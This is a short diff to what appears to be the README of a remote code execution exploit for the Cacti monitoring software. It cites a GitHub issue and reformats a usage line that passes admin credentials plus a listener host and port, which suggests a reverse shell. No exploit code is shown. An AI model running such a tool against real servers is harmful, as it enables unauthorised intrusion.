@@ -4,7 +4,8 @@
 <h4> Discovery : https://github.com/Cacti/cacti/issues/3622 </h4>
 
 
-<h3> Usage : python3 cacti_rce.py cacti_rce.py -H http://cactiurl -U `ADMIN USERNAME` -P `ADMIN PASSWORD` -l `LHOST` -p `LPORT` </h3>
+<h3> Usage : 
+python3 cacti_rce.py cacti_rce.py -H http://cactiurl -U `ADMIN USERNAME` -P `ADMIN PASSWORD` -l `LHOST` -p `LPORT` </h3>
   
 
 usage: cacti_rce.py [-h] [-H H] [-U U] [-P P] [-l L] [-p P]
